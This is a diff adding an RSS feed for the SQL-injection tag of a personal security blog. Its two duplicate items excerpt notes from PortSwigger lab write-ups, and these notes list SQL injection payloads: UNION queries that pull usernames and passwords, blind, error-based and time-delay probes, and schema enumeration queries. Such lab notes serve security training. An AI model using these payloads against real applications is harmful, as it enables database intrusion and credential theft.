@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>SQL-INJECTION on g4nd1v</title>
+    <link>https://g4nd1v.github.io/tags/sql-injection/</link>
+    <description>Recent content in SQL-INJECTION on g4nd1v</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>krishnannavadia@gmail.com (g4nd1v)</managingEditor>
+    <webMaster>krishnannavadia@gmail.com (g4nd1v)</webMaster>
+    <copyright>©2025, All Rights Reserved</copyright>
+    <lastBuildDate>Sat, 11 Oct 2025 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://g4nd1v.github.io/tags/sql-injection/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Portswigger SQL Injection Writeups</title>
+        <link>https://g4nd1v.github.io/portswigger/portswigger-sql-injection/</link>
+        <pubDate>Sat, 11 Oct 2025 00:00:00 +0000</pubDate>
+        <author>krishnannavadia@gmail.com (g4nd1v)</author>
+        <atom:modified>Sat, 11 Oct 2025 00:00:00 +0000</atom:modified>
+        <guid>https://g4nd1v.github.io/portswigger/portswigger-sql-injection/</guid>
+        <description>Notes Database type Query Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() # except oracleSELECT * FROM information_schema.tables(table_name)SELECT * FROM information_schema.columns WHERE table_name = &amp;#39;Users&amp;#39;(COLUMN_NAME)# oracleSELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = &amp;#39;USERS&amp;#39; &amp;#39; ORDER BY 1--&amp;#39; UNION SELECT NULL,NULL--# oracle DB - every select must have from&amp;#39; UNION SELECT NULL FROM DUAL--# finding a column&amp;#39; UNION SELECT &amp;#39;a&amp;#39;,NULL,NULL,NULL--# Retrieving multiple values within a single column&amp;#39; UNION SELECT username || &amp;#39;~&amp;#39; || password FROM users-- # blind SQL Injectionxyz&amp;#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &amp;#39;Administrator&amp;#39;), 1, 1) = &amp;#39;s# error based SQL Injectionxyz&amp;#39; AND (SELECT CASE WHEN (Username = &amp;#39;Administrator&amp;#39; AND SUBSTRING(Password, 1, 1) &amp;gt; &amp;#39;m&amp;#39;) THEN 1/0 ELSE &amp;#39;a&amp;#39; END FROM Users)=&amp;#39;a# Extracting sensitive data via verbose SQL error messagesCAST((SELECT example_column FROM example_table) AS int)# time delay&amp;#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &amp;#39;Administrator&amp;#39; AND SUBSTRING(Password, 1, 1) &amp;gt; &amp;#39;m&amp;#39;) = 1 WAITFOR DELAY &amp;#39;0:0:{delay}&amp;#39;--# out of bound&amp;#39;; exec master.</description>
+        
+        <dc:creator>g4nd1v</dc:creator>
+        <media:content url="https://g4nd1v.github.io/images/Portswigger/Portswigger-SQL-Injection/Pasted_image_20250101100059.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>Portswigger</category>
+            
+          
+            
+              <category>SQL-INJECTION</category>
+            
+          
+        
+        
+          
+            
+              <category>portswigger</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Portswigger SQL Injection Writeups</title>
+        <link>https://g4nd1v.github.io/posts/portswigger-sql-injection/</link>
+        <pubDate>Sat, 11 Oct 2025 00:00:00 +0000</pubDate>
+        <author>krishnannavadia@gmail.com (g4nd1v)</author>
+        <atom:modified>Sat, 11 Oct 2025 00:00:00 +0000</atom:modified>
+        <guid>https://g4nd1v.github.io/posts/portswigger-sql-injection/</guid>
+        <description>Notes Database type Query Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() # except oracleSELECT * FROM information_schema.tables(table_name)SELECT * FROM information_schema.columns WHERE table_name = &amp;#39;Users&amp;#39;(COLUMN_NAME)# oracleSELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = &amp;#39;USERS&amp;#39; &amp;#39; ORDER BY 1--&amp;#39; UNION SELECT NULL,NULL--# oracle DB - every select must have from&amp;#39; UNION SELECT NULL FROM DUAL--# finding a column&amp;#39; UNION SELECT &amp;#39;a&amp;#39;,NULL,NULL,NULL--# Retrieving multiple values within a single column&amp;#39; UNION SELECT username || &amp;#39;~&amp;#39; || password FROM users-- # blind SQL Injectionxyz&amp;#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &amp;#39;Administrator&amp;#39;), 1, 1) = &amp;#39;s# error based SQL Injectionxyz&amp;#39; AND (SELECT CASE WHEN (Username = &amp;#39;Administrator&amp;#39; AND SUBSTRING(Password, 1, 1) &amp;gt; &amp;#39;m&amp;#39;) THEN 1/0 ELSE &amp;#39;a&amp;#39; END FROM Users)=&amp;#39;a# Extracting sensitive data via verbose SQL error messagesCAST((SELECT example_column FROM example_table) AS int)# time delay&amp;#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &amp;#39;Administrator&amp;#39; AND SUBSTRING(Password, 1, 1) &amp;gt; &amp;#39;m&amp;#39;) = 1 WAITFOR DELAY &amp;#39;0:0:{delay}&amp;#39;--# out of bound&amp;#39;; exec master.</description>
+        
+        <dc:creator>g4nd1v</dc:creator>
+        <media:content url="https://g4nd1v.github.io/images/Portswigger/Portswigger-SQL-Injection/Pasted_image_20250101100059.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>Portswigger</category>
+            
+          
+            
+              <category>SQL-INJECTION</category>
+            
+          
+        
+        
+          
+            
+              <category>portswigger</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
